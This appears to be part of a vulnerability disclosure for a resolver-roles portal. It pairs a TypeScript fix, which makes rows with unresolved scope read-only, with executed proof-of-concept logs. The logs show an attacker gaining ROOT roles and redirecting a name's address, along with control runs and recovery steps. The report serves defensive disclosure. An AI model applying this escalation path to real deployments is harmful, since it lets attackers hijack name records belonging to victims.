--- a/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx
+++ b/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx
@@ -165,6 +165,9 @@ export const ResolverRolesSidebar = ({
   const selectedAccount = row?.original.account as Address
   const decodedRoles = (row?.original.decodedRoles ?? []) as ResolverRoleKey[]
   const resolvedNames = row?.original.resolvedNames ?? []
+  // A role scope that cannot be mapped to a concrete name or the explicit
+  // root sentinel must never be converted to the empty-string root scope.
+  const hasVerifiedRoleScope = resolvedNames.length > 0
 
   const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
   const originalPermissions = useMemo(
@@ -293,7 +296,8 @@ export const ResolverRolesSidebar = ({
   )
 
   const handleSaveChanges = () => {
-    if (!selectedAccount || saveMutation.isPending) return
+    if (!selectedAccount || !hasVerifiedRoleScope || saveMutation.isPending)
+      return
     setPendingAction({
       type: 'save',
       name: roleName,
@@ -307,6 +311,7 @@ export const ResolverRolesSidebar = ({
   const handleRemoveUser = () => {
     if (
       !selectedAccount ||
+      !hasVerifiedRoleScope ||
       decodedRoles.length === 0 ||
       removeUserMutation.isPending
     )
@@ -356,7 +361,7 @@ export const ResolverRolesSidebar = ({
       selectedAccount.toLowerCase() === connectedAddress.toLowerCase(),
   )
 
-  const canEdit = canManageRoles && !isSelf
+  const canEdit = canManageRoles && !isSelf && hasVerifiedRoleScope
 
   return (
     <Sheet open={open} onOpenChange={setOpen} defaultOpen={false}>
```

### Executed security assertions

Two clean frozen-code P4 runs passed. The second run recorded:

```
initial alpha in Resolver A nodes:       true
initial alpha role in Resolver A roles:  true
alpha after normal resolver change:      absent from Resolver A nodes
beta after normal resolver change:       present in Resolver A nodes
alpha role after resolver change:        remains in Resolver A roles

before Portal Edit:
  alpha ROLE_SET_TEXT:                    true
  ROOT ROLE_SET_ADDR:                     false
  beta ROLE_SET_ADDR:                     false
  attacker setAddr(beta):                 REVERT
  attacker self-grant ROOT:               REVERT
  unrelated control setAddr(beta):        REVERT
  Universal Resolver(beta):               victim

Portal wallet request:
  selector:                               0x072d5d77
  decoded:                                grantRootRoles(1, attacker)
  transaction:                            0x7ef5ce1509914f0fe3d017d76174edb8349cef7147be56f5f5b4a77becb491dd
  receipt:                                success

after Portal Edit:
  ROOT ROLE_SET_ADDR:                     true
  effective beta ROLE_SET_ADDR:           true
  attacker setAddr(beta):                 success
  attacker beta transaction:              0xbc65ee842c2d584ba3d5630c9c93910e62fea2644b0db1f81ffa58bc41be4e98
  Universal Resolver(beta):               attacker

after explicit recovery:
  ROOT ROLE_SET_ADDR:                     false
  effective beta ROLE_SET_ADDR:           false
  Universal Resolver(beta):               victim
  future attacker setAddr(beta):          REVERT

Playwright:                              1 passed
helper controls:                         3 passed
```

A second frozen-code run independently produced the same state transitions.

### Indexer-scope independence control

Apply only `fix-validation/panoptes-resource-compatibility-control.patch` to a separate checkout and set `CAND001_EXPECT_INITIAL_RESOLVED=true`. This patch only normalizes Portal's node-map resource key; it does not add the candidate fix.

The full executed control recorded:

```
initialPortalMappedName:                  cand001-alpha-1788554625.eth
initialPortalRowResolved:                 true
alphaPresentAfterResolverChange:          false
betaPresentAfterResolverChange:           true
rolePresentAfterResolverChange:           true
Portal transaction:                       grantRootRoles(1, attacker)
attacker setAddr(beta):                    success
Universal Resolver(beta):                 attacker
Playwright:                               1 passed
```

Therefore correcting the Panoptes representation mismatch does not remove the resolver-change trigger.

### Candidate-specific fix validation

The included `candidate-hardfail-fix.patch` makes unresolved rows read-only instead of mapping them to ROOT. It was tested together with the compatibility control so alpha was resolved before detach and became unresolved only after the normal resolver change.

Executed result:

```
initialPortalMappedName:                  alpha.eth
alphaPresentAfterResolverChange:          false
rolePresentAfterResolverChange:           true
Save present:                             false
Remove user present:                      false
ROOT ROLE_SET_ADDR:                       false
beta ROLE_SET_ADDR:                       false
attacker setAddr(beta):                   REVERT
Playwright:                               1 passed
native resolver-role tests:               16 passed
```

The natural prior-report `(account, resource)` grouping fix was also applied alone; the complete resolver-change P4 exploit still passed. Thus its fix and this finding's fail-closed fix are independent.

### Recovery interpretation

Recovery is neither automatic nor immediate. The attacker changes beta and the Universal Resolver returns the attacker address before recovery begins. After detection, the victim must submit one ROOT revoke and one beta record-restoration transaction. These restore future state but do not retroactively undo actions completed while the unauthorized ROOT role was active. This PoC does not claim a permanent takeover, direct theft, or an unexecuted third-party payment.
